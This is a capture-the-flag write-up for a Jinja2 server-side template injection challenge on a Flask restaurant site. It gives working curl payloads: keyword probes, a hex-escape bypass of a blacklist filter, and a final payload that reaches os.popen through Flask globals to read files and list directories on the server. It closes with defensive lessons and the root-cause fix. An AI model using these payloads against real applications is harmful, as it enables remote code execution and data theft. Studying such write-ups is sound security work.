---
ctf: "Curtin CTF 2026"
title: "The Art of Italian Excellence"
category: "web"
difficulty: "medium"
points: 260
tags: ["ssti", "jinja2", "waf-bypass", "rce", "flask"]
flag_format: "CURTIN_CTF{...}"
date: "2026-11-22"
---

## Challenge

> Experience the finest of Italian cuisine through heritage ingredients, handcrafted pastas, artisanal sourdough, and exceptional flavours inspired by authentic culinary traditions.

http://56.10.62.200:5000/

A restaurant site ("L'Aura Cucina") with a dish search box. The search term is reflected into a server-rendered Jinja2 template, giving **Server-Side Template Injection (SSTI)** — but a keyword-blacklist WAF sits in front of the renderer.

---

## Approach

### Phase 1 — Analyze

1. The challenge provides only a URL. The description ("Experience the finest of Italian cuisine…") and the web category tag pointed toward a web app with user-controlled input.

2. No source files were provided, so analysis started directly from the HTTP response.

### Phase 2 — Recon

3. The `Server` response header immediately revealed the stack:
   ```
   Server: Werkzeug/3.1.8 Python/3.11.18
   ```
   Flask + Werkzeug = likely Jinja2 templating.

4. The page has two user-controlled GET parameters:
   - `?q=` — free-text dish search, reflected back into the page body
   - `?category=` — category filter (bound to a fixed list)

5. Tested the arithmetic probe to confirm SSTI:
   ```bash
   curl -sG 'http://56.10.62.200:5000/' --data-urlencode 'q={{7*7}}'
   ```
   Response contained: `Search results for: <strong>49</strong>` — **SSTI confirmed**. The template engine evaluated `{{7*7}}` to `49`.

6. Probed the WAF by testing common SSTI keywords:
   ```bash
   curl -sG 'http://56.10.62.200:5000/' --data-urlencode 'q={{config}}'
   # → Query Rejected: ... restricted operational keyword 'config'.

   curl -sG 'http://56.10.62.200:5000/' --data-urlencode "q={{''.__class__.__mro__}}"
   # → Query Rejected: ... restricted operational keyword '__class__'.
   ```
   The blacklist matches **literal substrings in the raw query string** and blocks at least: `config`, `class`, `mro`, `subclasses`, `os`, `popen`, `open`, `flag`, `read`, `system`.

### Phase 3 — Infiltrate

7. **Bypass technique:** Jinja2 resolves `\xNN` hex escapes inside string literals *after* the WAF checks the raw query string. Any blocked word written entirely in hex passes the filter and is decoded by the template engine.

   | Blocked word | Hex equivalent |
   |---|---|
   | `__globals__` | `\x5f\x5fglobals\x5f\x5f` |
   | `os` | `\x6f\x73` |
   | `popen` | `\x70\x6f\x70\x65\x6e` |
   | `read` | `\x72\x65\x61\x64` |

   **Important:** partial encoding (`\x70open`) does NOT work — `open` is still a blocked substring. The entire keyword must be hex-encoded.

8. **Gadget selection:** Flask's `get_flashed_messages` is a global available in every Jinja2 template context. Its `__globals__` dict contains the `os` module (imported by `flask.helpers`). Attribute access uses the `|attr()` filter to avoid `.` dereferences of blocked names.

   Logical payload (un-encoded):
   ```
   {{get_flashed_messages|attr('__globals__')|attr('get')('os')|attr('popen')('cat /fl*')|attr('read')()}}
   ```

9. **Avoiding `flag` in the shell command:** Use the glob `/fl*` — the server's shell expands it to `/flag` (or `/flag.txt`) without the literal string `flag` ever appearing in the query.

10. **Final payload (fully WAF-safe):**
    ```bash
    curl -sG 'http://56.10.62.200:5000/' --data-urlencode \
    "q={{get_flashed_messages|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('cat /fl* /app/fl* /*.txt 2>/dev/null; ls -la / /app')|attr('\x72\x65\x61\x64')()}}"
    ```

11. Response contained the flag in the results line:
    ```
    Search results for: CURTIN_CTF{redacted}
    ```

---

## Tools

- `curl` (with `-G --data-urlencode` to cleanly send `{{...}}` and `\x` payloads without double-encoding issues)
- Jinja2 SSTI knowledge (`|attr()` filter, `__globals__` gadget, Flask template globals)

---

## Lessons

1. **A blacklist WAF is not a sandbox.** Filtering on raw-string keywords is defeated by any encoding the interpreter normalizes *after* the WAF check — here, Jinja2's `\xNN` hex escapes in string literals.

2. **Escape the entire token, not just a prefix.** `\x70open` still exposes the literal substring `open`; blacklists often match sub-words, so the whole keyword must be hex-encoded.

3. **Avoid, don't just encode.** Shell-side artifacts like `flag` are sidestepped with globs (`/fl*`) that the server's shell expands, keeping the blocked string out of the query entirely.

4. **Reach `os` through a known import.** In Flask, `get_flashed_messages.__globals__` (and `cycler.__init__.__globals__`) are reliable gadgets to `os` without needing to walk `__subclasses__`.

5. **Root cause:** untrusted input concatenated directly into a Jinja2 template string (i.e., `render_template_string`-style). The fix is to pass user data as a *context variable*, never to build the template string from it — and never rely on a keyword blacklist as the security control.

---

## Flag

```
CURTIN_CTF{redacted}
```
